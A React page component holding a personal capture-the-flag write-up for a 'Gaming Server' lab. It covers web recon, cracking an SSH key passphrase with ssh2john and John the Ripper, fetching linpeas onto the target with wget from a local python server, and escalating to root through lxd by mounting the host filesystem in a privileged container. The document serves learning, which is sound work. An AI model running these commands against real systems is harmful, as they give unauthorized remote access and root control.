import { ThemeToggle } from "@/components/ThemeToggle"
import { StarBackground } from '@/components/StarBackground';
import { Footer } from '@/components/Footer'
import { Navbar } from "@/components/Navbar";

export const Writeup3 = () => {
    return (<div className="min-h-screen bg-background text-foreground overflow-x-hidden">

        {/* Theme Toggle */}
            <ThemeToggle />
        {/* Background Effects */}
            <StarBackground />

            <Navbar />
            
        {/* Writeups */}
        <div id="writeup3" className="relative min-h-screen px-4">
            <div id="hero" className="container max-w-6xl mx-auto z-10">
                <h1 className="text-4xl md:text-6xl pt-50 pb-10 font-bold tracking-tight">
                    Gaming Server
                </h1>
                
                <p className="text-left text-muted-foreground p-4">
                    Welcome to another easy write up. This one is about web vulnerability, remote access and privilege escalation.
                    It was my first time experiencing privesc, so it was a fun one to learn.
                </p>
                    
                <h1 className="text-2xl md:text-4xl pt-10 font-semibold tracking-tight">
                    Reconnaissance
                </h1>
                
                <p className="text-left text-muted-foreground p-4">
                    We can visit the webpage by typing the target ip into the url
                </p>

                <img src='/assets/writeup3/writeup3-1.png' alt='img1' />

                <p className="text-left text-muted-foreground p-4">
                    After navigating through the poorly designed website, I found a button that took me to an uploads page, revealing a dictionary list,
                    some hacker manifesto and a jpeg. The dictionary was the only thing of interest to me, so I downloaded it in case there was some password cracking to do.
                </p>

                <img
                    src='/assets/writeup3/writeup3-2.png'
                    alt='img2'
                    className="mx-auto"
                />

                <p className="text-left text-muted-foreground p-4">
                    Can't miss a website recon without inspecting the page for some hidden comments.
                </p>

                <img
                    src='/assets/writeup3/writeup3-3.png'
                    alt='img3'
                    className="mx-auto pb-3.5"
                />
                
                <p className="text-left text-muted-foreground p-4">
                    Someone named john, which can indicate a username for a login of some sort. Noted it down. Next I ran gobuster to find some pages:
                </p>

                <img
                    src='/assets/writeup3/writeup3-4.png'
                    alt='img4'
                    className="mx-auto"
                />

                <p className="text-left text-muted-foreground p-4">
                    Found a page called secret with an ssh encrypted private key. Downloaded it. 
                </p>

                <img
                    src='/assets/writeup3/writeup3-5.png'
                    alt='img5'
                    className="mx-auto"
                />

                <h1 className="text-2xl md:text-4xl p-10 font-semibold tracking-tight">
                    Exploiting
                </h1>

                <p className="text-left text-muted-foreground p-4">
                    I have the resources I need to conduct what is hinted to be remote access.
                    I can try to ssh into the server with username john and the private key, and we just need to decrypt the key with a password cracker.
                    I used ssh2john to format the key so john the ripper can crack it.
                </p>
                
                <p className="text-left text-muted-foreground p-4">
                    <code className="code-font">ssh2john hashFile &gt; hashFile.hash</code><br/>
                    Then combined the wordlist I found earlier<br/>
                    <code className="code-font">john —wordlist=dict.lst hashFile.hash</code><br />
                    Giving me the passphrase. I type in the passphrase when prompted and I’m in.
                </p>
                
                <img
                    src='/assets/writeup3/writeup3-6.png'
                    alt='img6'
                    className="mx-auto"
                />

                <p className="text-left text-muted-foreground p-4">
                    The first flag is in a text file in the home directory.<br />

                    The next part was pretty lengthy, and required a few steps. It requires us to a root flag, so we need to privesc.
                    This was when I learned about peass, which searches for local privilege escalation paths that can be exploited.
                    I also learnt how to fetch files from a local python server into a remote machine.<br />

                    So I downloaded a binary file of linpeas into the directory of my python server.
                    I typed in <code className="code-font">python -m http.server</code> which starts a web server serving files in that directory. Then, on the remote machine,
                    I typed in <code className="code-font">wget [http://localip/linpeas.sh](http://192.168.158.46:8000/linpeas.sh)</code> which downloads the binary onto the remote machine.<br />

                    After running the command, I searched for text highlighted in red and yellow which indicates a high vulnerability vector.
                </p>

                <img
                    src='/assets/writeup3/writeup3-7.png'
                    alt='img7'
                    className="mx-auto"
                />

                <p className="text-left text-muted-foreground p-4">
                    I found out that lxd is a linux container that is prone to a local privesc vulnerability if unprivileged users can acess lxd as an lxd user.
                    Basically, what you needed to do was open up that container as a root user. After some research, I used alpine to create an alpine linux image to mount onto the container.
                    I used the same method of transferring files and got alpine onto the remote machine.
                </p>

                <p className="text-left text-muted-foreground p-4">
                    I ran <code className="code-font">lxc image import alpine --alias alpine</code> to import the image, <br />
                    <code className="code-font">lxc init alpine rootuser -c security.privileged=true</code> to add root permissions. <br />
                    Then, to mount onto the container: <br />
                    <code className="code-font">lxc config device add rootuser host-root disk source=/ path=/mnt/root recursive=true</code> <br />
                    And finally, to start and enter the container: <br/>
                    <code className="code-font">lxc start rootuser</code> <br />
                    <code className="code-font">lxc exec rootusr /bin/sh</code> <br />
                    Now we are root user.
                </p>

                <img
                    src='/assets/writeup3/writeup3-8.png'
                    alt='img8'
                    className="mx-auto pb-3.5"
                />

                <p className="text-left text-muted-foreground p-4">
                    Because the first flag was in a text file named user.txt, I assume we need to find something like root.txt.
                    So I did a recursive search with <code className="code-font">"find . -type f -name "root.txt".</code>
                </p>

                <img
                    src='/assets/writeup3/writeup3-9.png'
                    alt='img9'
                    className="mx-auto"
                />

                <p className="text-left text-muted-foreground p-4">
                    And the flag is revealed in that text file. Thanks for reading my writeup! I'm still on the easy ones because I still have lots to learn.
                </p>

            </div>
        </div>
        {/* Footer */}
            <Footer />
    </div>)
}